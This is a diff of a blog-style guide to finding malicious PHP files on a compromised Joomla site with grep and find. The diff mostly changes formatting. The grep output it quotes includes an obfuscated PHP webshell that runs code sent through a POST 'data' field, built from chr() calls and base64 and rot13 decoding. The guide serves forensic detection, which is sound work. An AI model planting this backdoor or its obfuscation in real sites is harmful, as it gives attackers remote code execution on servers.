@@ -88,15 +88,18 @@ This code would be tipically inserted as the first line of the PHP
 file, starting with a variable, so we can look for that pattern, first
 line starting with `<?php $`:
 
-<pre class="shell">
-<samp>
-<span class="shell-prompt">$</span> <kbd>grep -m 1 -r '^<?php \$' .</kbd>
+~~~ bash
+$ grep -m 1 -r '^<?php \$' .</kbd>
+~~~
+
+Output:
+
+~~~ php
 ./website/components/com_users/views/profile/tmpl/default_params.php:<?php $fields = $this->form->getFieldset('params'); ?>
 ./website/administrator/cache/com_ajax3j/9411v11.php:<?php $coi=chr(97).chr(115)."\x73".chr(101)."\x72"."\x74";$zioj=chr(98).chr
 (97)."\x73"."\x65"."\x36".chr(52)."\x5f"."\x64".chr(101)."c"."\x6f".chr(100).chr(101);$jd=chr(115)."\x74".chr(114)."\x5f"."r".chr(111)
 ."\x74"."1"."3";@$coi(@$zioj(@$jd($_POST[chr(100).chr(97)."t".chr(97)])));die(); ?>
-</samp>
-</pre>
+~~~
 
 First line of the output looks fine, but the second line looks a bit
 more than suspicious code, we can decode it and understand what it is
@@ -115,11 +118,11 @@ permission 777.
 >               File's  permission  bits  are  exactly  mode (octal or sym‐
 >               bolic).  Since an exact match is required, if you  want  to
 >               use this form for symbolic modes, you may have to specify a
->               rather complex mode string.  For example `-perm  g=w'  will
+>               rather complex mode string.  For example -perm  g=w  will
 >               only  match  files  which have mode 0020 (that is, ones for
 >               which group write permission is the only  permission  set).
->               It  is more likely that you will want to use the `/' or `-'
->               forms, for example `-perm -g=w',  which  matches  any  file
+>               It  is more likely that you will want to use the / or -
+>               forms, for example -perm -g=w,  which  matches  any  file
 >               with  group write permission.  See the EXAMPLES section for
 >               some illustrative examples.
 > 
